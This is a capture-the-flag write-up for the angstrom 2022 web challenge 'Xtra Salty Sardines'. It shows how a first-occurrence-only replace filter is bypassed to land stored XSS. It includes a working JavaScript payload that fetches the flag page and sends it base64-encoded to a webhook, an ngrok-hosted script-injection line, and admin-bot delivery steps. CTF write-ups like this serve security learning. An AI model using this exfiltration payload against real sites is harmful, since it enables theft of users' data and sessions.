# angstrom 2022 - Xtra Salty Sardines

* **Category:** web
* **Points:** 70

## Challenge

>Clam was intensely brainstorming new challenge ideas, when his stomach growled! He opened his favorite tin of salty sardines, took a bite out of them, and then got a revolutionary new challenge idea. What if he wrote a site with an extremely suggestive acronym?

## Solution
```python
vuln = "Xtra Salty Sardines"
print(f"Vuln: {vuln[0]}{vuln[5]}{vuln[11]}")
#Vuln: XSS
```
#### XSS Bypass
![image](https://user-images.githubusercontent.com/78451563/166805274-bb37ee0d-1452-474e-a256-719426e7e6da.png)
![image](https://user-images.githubusercontent.com/78451563/166806002-020feebe-1b22-4228-85bb-4209f71a4433.png)</br>
♡ Though it uses the replace function to sanatize the input, it will only act on the first character presented.</br>
♡ Therefore, we can enter our payload twice to bypass.</br>
#### Ngrok + Webhook
```javascript
//payload.js
var request = new XMLHttpRequest();
request.onload = sendBack;
request.open('GET','https://xtra-salty-sardines.web.actf.co/flag');
request.send();

function sendBack(){
        location = '<WEB HOOK URL>/result?result=' + btoa(this.responseText);
}
```
♡ We can host this payload using ngrok `ngrok http 80`</br>
♡ And in the script replace the `sendBack` location using a webhook from [webook.site](https://webhook.site)</br>
#### Payload
![image](https://user-images.githubusercontent.com/78451563/166808856-29dd8652-c9a4-4a73-b082-afd198f9f65a.png)</br>
![image](https://user-images.githubusercontent.com/78451563/166809657-af371a6d-1017-4bcf-b21f-532eb386e121.png)</br>
`<h1>"r4nd0m"</h1><script src="https://a479-80-3-68-53.ngrok.io/payload.js"></script>`</br>
♡ This bypassing payload source is to the `payload.js` hosted on our `ngrok` server</br>
♡ When sent our payload to `https://xtra-salty-sardines.web.actf.co/` we should create a directory with our payload inside e.g `/sardines/abcdefg`</br>
### Exploitation
![image](https://user-images.githubusercontent.com/78451563/166809982-08d011ad-0833-43c1-844d-a3570807b972.png)
![image](https://user-images.githubusercontent.com/78451563/166811614-60adf1ca-0e49-4f45-aed5-4508e32b87b3.png)
♡ Visit [Admin bot](https://admin-bot.actf.co/xtra-salty-sardines)</br>
♡ Send the link which has the XSS payload on</br>
♡ Visited webhooks and base64 decode the results
```
Flag: actf{those_sardines_are_yummy_yummy_in_my_tummy}
```
